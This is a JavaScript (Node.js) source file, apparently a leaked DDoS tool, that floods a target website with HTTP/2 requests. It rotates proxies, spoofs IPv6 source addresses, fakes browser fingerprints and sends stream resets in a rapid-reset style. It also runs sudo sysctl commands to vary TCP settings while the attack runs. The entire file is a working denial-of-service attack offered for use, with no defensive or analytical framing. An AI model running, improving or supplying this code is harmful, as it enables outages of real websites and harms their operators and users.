// leaked by t.me/leakddosmethods
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
const { setsockopt } = require('sockopt')

process.setMaxListeners(0);
process.on('uncaughtException', function (e)  {  });
process.on('unhandledRejection', function (e) {  });

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const target = process.argv[2];
const time = process.argv[3];
const ratelimit = process.argv[4];
const threads = process.argv[5];
const proxyfile = process.argv[6];
const ipversion = process.argv[7];

if (!target || !time || !ratelimit || !threads || !proxyfile || !ipversion) {
    console.clear();
    console.error(`node xreset <URL> <Time> <threads> <ratelimit> <Proxy List> <ipversion>`);
    console.error(`node xreset https://www.google.com/ 120 90 9 proxy.txt ipv4\n`);
    process.exit(1);
}

const mqfi9qjkf3i = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
let custom_table = 65535;
let custom_window = 6211455;
let custom_header = 262144;
let custom_update = 15663105;
let headersPerReset = 0;
let SO_SNDBUF = 7
let SO_RCVBUF = 8
let TCP_NODELAY = 1
let SOL_SOCKET = 1
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    const flags = data.readUint8(4)
    const streamId = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

function getLocalIPv6() {
    const interfaces = os.networkInterfaces();
    let ipv6Address = null;

    for (const ifaceName of Object.keys(interfaces)) {
        const iface = interfaces[ifaceName];
        const ipv6 = iface.find((details) => details.family === 'IPv6' && !details.internal);

        if (ipv6) {
            ipv6Address = ipv6.address.split('%')[0];
            ipv6Address = ipv6Address.replace('::2', '');
            break;
        }
    }

    return ipv6Address;
}

function newfunction(streamId) {
    const versions = [
        'chrome',
        'edge',
        'edge-mobile',
    ];

    let version = Math.floor(Math.random() * (121 - 119 + 1) + 119);
    const fdjkdfjdf = Math.floor(Math.random() * versions.length);
    const fqiwejfiqwid = versions[fdjkdfjdf];
    if (streamId == 1) {
        if (fqiwejfiqwid == "chrome") {
            useragent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
            platform = "Windows";
            accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
            lang = "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7";
            mobile = "?0";
            custom_table = 65536;
            custom_window = 6291456;
            custom_header = 262144;
            custom_update = 15663105;
        } else if (fqiwejfiqwid == "edge-mobile") {
            useragent = `Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36 EdgA/${version}.0.0.0`;
            platform = "Android";
            accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
            lang = "ru-RU,ru;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6";
            mobile = "?1";
            custom_table = 4096;
            custom_window = 6291455;
            custom_header = 262124;
            custom_update = 15663100;
        } else if (fqiwejfiqwid == "edge") {
            useragent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Edg/${version}.0.0.0`;
            platform = "Windows";
            accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
            lang = "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7";
            mobile = "?0";
            custom_table = 65535;
            custom_window = 6291458;
            custom_header = 262122;
            custom_update = 15663102;
        }
    }
    return { useragent, platform, accept, lang, custom_table, custom_window, custom_header, custom_update };
}

function updateVersionInUserAgent(userAgent, newVersion) {
    const uaParts = userAgent.split(' ');
    const browserIndex = uaParts.findIndex(part => part.includes('Chrome/') || part.includes('EdgA/') || part.includes('Edg/'));
    if (browserIndex !== -1) {
        const browserParts = uaParts[browserIndex].split('/');
        if (browserParts.length === 2) {
            const versionComponents = browserParts[1].split('.');
            while (versionComponents.length < 3) {
                versionComponents.push('0');
            }
            if (newVersion) {
                const newVersionComponents = newVersion.split('.');
                for (let i = 0; i < 3; i++) {
                    if (newVersionComponents[i]) {
                        versionComponents[i] = newVersionComponents[i];
                    }
                }
            }
            browserParts[1] = versionComponents.join('.');
            uaParts[browserIndex] = browserParts.join('/');
        }
    }

    const updatedUA = uaParts.join(' ');
    return updatedUA;
}

const ipv6 = getLocalIPv6();
const array = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f'];
var gogobypassknown = '';

function rnd_ip_block() {
    const a = array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)] +
        array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)];
    const b = array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)] +
        array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)];
    const c = array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)] +
        array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)];
    const d = array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)] +
        array[Math.floor(Math.random() * 16)] + array[Math.floor(Math.random() * 16)];

    return `${ipv6}:${a}:${b}:${c}:${d}`;
}

setInterval(() => {
    gogobypassknown = `${getRandomChar()}`;
}, 3333);

function go() {
    var [, username, password, proxyHost, proxyPort] = "";
    var authString = "";
    var ip_address = rnd_ip_block();

    if (ipversion == 'ipv4') {
        [proxyHost, proxyPort] = mqfi9qjkf3i[~~(Math.random() * mqfi9qjkf3i.length)].split(':');
    } else if (ipversion == 'ipv4auth') {
        const proxyString = mqfi9qjkf3i[~~(Math.random() * mqfi9qjkf3i.length)];
        const regex = /^(.*?):(.*?)@(.*?):(\d+)$/;
        const matches = proxyString.match(regex);
        [, username, password, proxyHost, proxyPort] = matches;
        authString = Buffer.from(`${username}:${password}`).toString('base64');
    }

    let SocketTLS;

    if (ipversion == "localhost") {
        const netSocket = net.connect({
            port: 443,
            host: url.host,
            localAddress: ip_address
        }, () => {
            setsockopt(netSocket, 6, 3, 1)
            setsockopt(netSocket, 6, TCP_NODELAY, 1)
            setsockopt(netSocket, SOL_SOCKET, SO_SNDBUF, 1000000)
            setsockopt(netSocket, SOL_SOCKET, SO_RCVBUF, 1000000)

            SocketTLS = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                secure: true,
                rejectUnauthorized: false
            }, () => {            
                let streamId = Math.floor(Math.random()*(6500 - 1) + 1)
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4);
                const main_fuller = newfunction(streamId);
                updateWindow.writeUInt32BE(main_fuller.custom_update, 0);
                let updatedUserAgent = `${main_fuller.useragent}`;

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        ...(Math.random() < 0.5 ? [[1, main_fuller.custom_header]] : []),
                        [2, 0],
                        ...(Math.random() < 0.5 ? [[4, main_fuller.custom_window]] : []),
                        ...(Math.random() < 0.5 ? [[6, main_fuller.custom_table]] : []),
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                SocketTLS.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                SocketTLS.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                SocketTLS.end(() => SocketTLS.destroy())
                            }

                        } else {
                            break
                        }
                    }
                })

                SocketTLS.write(Buffer.concat(frames))

                function main() {
                    if (SocketTLS.destroyed) {
                        return
                    }
                    for (let i = 0; i < ratelimit; i++) {

                        let generateNumbers = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
                        let version = Math.floor(Math.random() * (121 - 119 + 1) + 119);
                        updatedUserAgent = updateVersionInUserAgent(updatedUserAgent, version + ".0.0.0");

                        const headers = Object.entries({
                            ":method": "GET",
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": url.pathname + `${gogobypassknown}`,
                        }).concat(Object.entries({
                            "sec-ch-ua": `\"Chromium\";v=\"${version}\", \"Not(A:Brand\";v=\"${generateNumbers}\", \"Google Chrome\";v=\"${version}\"`,
                            "sec-ch-ua-mobile": `${main_fuller.mobile}`,
                            "sec-ch-ua-platform": `${main_fuller.platform}`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": `${main_fuller.useragent}`,
                            "accept": `${main_fuller.accept}`,
                        }).filter(a => a[1] != null));

                        const headers2 = Object.entries({
                            "sec-fetch-site": "none",
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                        }).filter(a => a[1] != null);

                        const headers3 = Object.entries({
                            "accept-encoding": "gzip, deflate, br, zstd",
                            "accept-language": `${main_fuller.lang}`,
                            ...(Math.random() < 0.5 && { "cookie": `${generateNumbers}` }),
                            ...(Math.random() < 0.5 && { "referer": `https://${url.hostname}/${generateNumbers}` }),
                        }).filter(a => a[1] != null);

                        for (let i = headers3.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers3[i], headers3[j]] = [headers3[j], headers3[i]];
                        }

                            /*const headers4 = Object.entries({
                                ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                                ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                                ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                                ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                            }).filter(a => a[1] != null);

                            for (let i = headers4.length - 1; i > 0; i--) {
                                const j = Math.floor(Math.random() * (i + 1));
                                [headers4[i], headers4[j]] = [headers4[j], headers4[i]];
                            }*/

                        const combinedHeaders = headers.concat(headers2).concat(headers3);//.concat(headers4);

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);

                        SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                        if (headersPerReset >= 5) {
                            SocketTLS.write(encodeFrame(streamId, 3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0));
                            headersPerReset = 0;
                        }
                        streamId += 2;
                    }
                    setTimeout(() => {

                        main()
                    }, 1000 / ratelimit);

                }

                main()
            }).on('error', () => {
                SocketTLS.destroy()
            })

        }).once('error', () => {}).once('close', () => {
            if (SocketTLS) {
                SocketTLS.end(() => { SocketTLS.destroy(); go() })
            }
        })
    } else if (ipversion == "ipv4") {
        const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
            netSocket.once('data', () => {
                setsockopt(netSocket, 6, 3, 1)
                setsockopt(netSocket, 6, TCP_NODELAY, 1)
                setsockopt(netSocket, SOL_SOCKET, SO_SNDBUF, 1000000)
                setsockopt(netSocket, SOL_SOCKET, SO_RCVBUF, 1000000)

                SocketTLS = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    servername: url.host,
                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                    secure: true,
                    rejectUnauthorized: false
                }, () => {
                    let streamId = 1
                    let data = Buffer.alloc(0)
                    let hpack = new HPACK()
                    hpack.setTableSize(4096)

                    const updateWindow = Buffer.alloc(4);
                    updateWindow.writeUInt32BE(custom_update, 0);

                    let mama = 0;

                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([
                            ...(Math.random() < 0.5 ? [[1, custom_header]] : []),
                            [2, 0],
                            ...(Math.random() < 0.5 ? [[4, custom_window]] : []),
                            ...(Math.random() < 0.5 ? [[6, custom_table]] : []),
                        ])),
                        encodeFrame(0, 8, updateWindow)
                    ];

                    SocketTLS.on('data', (eventData) => {
                        data = Buffer.concat([data, eventData])

                        while (data.length >= 9) {
                            const frame = decodeFrame(data)
                            if (frame != null) {
                                data = data.subarray(frame.length + 9)
                                if (frame.type == 4 && frame.flags == 0) {
                                    SocketTLS.write(encodeFrame(0, 4, "", 1))
                                }
                                if (frame.type == 7 || frame.type == 5) {
                                    SocketTLS.end(() => SocketTLS.destroy())
                                }

                            } else {
                                break
                            }
                        }
                    })

                    SocketTLS.write(Buffer.concat(frames))

                    function main() {
                        if (SocketTLS.destroyed) {
                            return
                        }
                        let generateNumbers = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
                        let version = Math.floor(Math.random() * (103 - 100 + 1) + 100);
                        for (let i = 0; i < ratelimit; i++) {
                            const headers = Object.entries({
                                ":method": "GET",
                                ":authority": url.hostname,
                                ":scheme": "https",
                                ":path": url.pathname + `${gogobypassknown}`,
                            }).concat(Object.entries({
                                "sec-ch-ua": `\"Chromium\";v=\"${version}\", \"Not(A:Brand\";v=\"${generateNumbers}\", \"Google Chrome\";v=\"${version}\"`,
                                "sec-ch-ua-mobile": "?0",
                                "sec-ch-ua-platform": "\"Windows\"",
                                "upgrade-insecure-requests": "1",
                                "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                            }).filter(a => a[1] != null));

                            const headers2 = Object.entries({
                                "sec-fetch-site": "none",
                                ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                                ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                                ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                            }).filter(a => a[1] != null);

                            const headers3 = Object.entries({
                                "accept-encoding": "gzip, deflate, br, zstd",
                                "accept-language": `ru,en-US;q=0.9,en;q=0.0`,
                                ...(Math.random() < 0.5 && { "cookie": `${generateNumbers}` }),
                                ...(Math.random() < 0.5 && { "referer": `https://${url.hostname}/${generateNumbers}` }),
                            }).filter(a => a[1] != null);

                            for (let i = headers3.length - 1; i > 0; i--) {
                                const j = Math.floor(Math.random() * (i + 1));
                                [headers3[i], headers3[j]] = [headers3[j], headers3[i]];
                            }

                            /*const headers4 = Object.entries({
                                ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                                ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                                ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                                ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                            }).filter(a => a[1] != null);

                            for (let i = headers4.length - 1; i > 0; i--) {
                                const j = Math.floor(Math.random() * (i + 1));
                                [headers4[i], headers4[j]] = [headers4[j], headers4[i]];
                            }*/

                            const combinedHeaders = headers.concat(headers2).concat(headers3);//.concat(headers4);

                            const packed = Buffer.concat([
                                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                hpack.encode(combinedHeaders)
                            ]);

                            SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                            if (headersPerReset >= 5) {
                                SocketTLS.write(encodeFrame(streamId, 3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0));
                                headersPerReset = 0;
                            }
                            streamId += 2;
                        }
                        setTimeout(() => {

                            main()
                        }, 1000 / ratelimit);

                    }

                    main()
                }).on('error', () => {
                    SocketTLS.destroy()
                })
            })
            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        }).once('error', () => { }).once('close', () => {
            if (SocketTLS) {
                SocketTLS.end(() => { SocketTLS.destroy(); go() })
            }
        })
    } else if (ipversion == 'ipv4auth') {
        const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
            netSocket.once('data', () => {
                setsockopt(netSocket, 6, 3, 1)
                setsockopt(netSocket, 6, TCP_NODELAY, 1)
                setsockopt(netSocket, SOL_SOCKET, SO_SNDBUF, 1000000)
                setsockopt(netSocket, SOL_SOCKET, SO_RCVBUF, 1000000)

                SocketTLS = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: ['h2'],
                    servername: url.host,
                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                    secure: true,
                    rejectUnauthorized: false
                }, () => {
                    let streamId = 1
                    let data = Buffer.alloc(0)
                    let hpack = new HPACK()
                    hpack.setTableSize(4096)

                    const updateWindow = Buffer.alloc(4);
                    updateWindow.writeUInt32BE(custom_update, 0);

                    const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([
                            ...(Math.random() < 0.5 ? [[1, custom_header]] : []),
                            [2, 0],
                            ...(Math.random() < 0.5 ? [[4, custom_window]] : []),
                            ...(Math.random() < 0.5 ? [[6, custom_table]] : []),
                        ])),
                        encodeFrame(0, 8, updateWindow)
                    ];

                    SocketTLS.on('data', (eventData) => {
                        data = Buffer.concat([data, eventData])

                        while (data.length >= 9) {
                            const frame = decodeFrame(data)
                            if (frame != null) {
                                data = data.subarray(frame.length + 9)
                                if (frame.type == 4 && frame.flags == 0) {
                                    SocketTLS.write(encodeFrame(0, 4, "", 1))
                                }
                                if (frame.type == 7 || frame.type == 5) {
                                    SocketTLS.end(() => SocketTLS.destroy())
                                }

                            } else {
                                break
                            }
                        }
                    })

                    SocketTLS.write(Buffer.concat(frames))

                    function main() {
                        if (SocketTLS.destroyed) {
                            return
                        }
                        let generateNumbers = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
                        let version = Math.floor(Math.random() * (103 - 100 + 1) + 100);
                        for (let i = 0; i < ratelimit; i++) {
                            const headers = Object.entries({
                                ":method": "GET",
                                ":authority": url.hostname,
                                ":scheme": "https",
                                ":path": url.pathname + `${gogobypassknown}`,
                            }).concat(Object.entries({
                                "sec-ch-ua": `\"Chromium\";v=\"${version}\", \"Not(A:Brand\";v=\"${generateNumbers}\", \"Google Chrome\";v=\"${version}\"`,
                                "sec-ch-ua-mobile": "?0",
                                "sec-ch-ua-platform": "\"Windows\"",
                                "upgrade-insecure-requests": "1",
                                "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
                                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                            }).filter(a => a[1] != null));

                            const headers2 = Object.entries({
                                "sec-fetch-site": "none",
                                ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                                ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                                ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                            }).filter(a => a[1] != null);

                            const headers3 = Object.entries({
                                "accept-encoding": "gzip, deflate, br, zstd",
                                "accept-language": `ru,en-US;q=0.9,en;q=0.0`,
                                ...(Math.random() < 0.5 && { "cookie": `${generateNumbers}` }),
                                ...(Math.random() < 0.5 && { "referer": `https://${url.hostname}/${generateNumbers}` }),
                            }).filter(a => a[1] != null);

                            for (let i = headers3.length - 1; i > 0; i--) {
                                const j = Math.floor(Math.random() * (i + 1));
                                [headers3[i], headers3[j]] = [headers3[j], headers3[i]];
                            }

                            /*const headers4 = Object.entries({
                                ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                                ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                                ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                                ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                            }).filter(a => a[1] != null);

                            for (let i = headers4.length - 1; i > 0; i--) {
                                const j = Math.floor(Math.random() * (i + 1));
                                [headers4[i], headers4[j]] = [headers4[j], headers4[i]];
                            }*/

                            const combinedHeaders = headers.concat(headers2).concat(headers3);//.concat(headers4);
                            //const combinedHeaders = skinchanger();

                            const packed = Buffer.concat([
                                Buffer.from([0x80, 0, 0, 0, 0xFF]),
                                hpack.encode(combinedHeaders)
                            ]);

                            SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                            if (headersPerReset >= 5) {
                                SocketTLS.write(encodeFrame(streamId, 3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0));
                                headersPerReset = 0;
                            }
                            streamId += 2;
                        }
                        setTimeout(() => {
                            main()
                        }, 1000 / ratelimit);

                    }

                    main()
                }).on('error', () => {
                    SocketTLS.destroy()
                })
            })
            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\nProxy-Authorization: Basic ${authString}\r\n\r\n`);
        }).once('error', () => { }).once('close', () => {
            if (SocketTLS) {
                SocketTLS.end(() => { SocketTLS.destroy(); go() })
            }
        })
    }
}

function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}


if (cluster.isMaster) {
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);

} else {
    setInterval(go);
    setTimeout(() => process.exit(1), time * 1000);
}
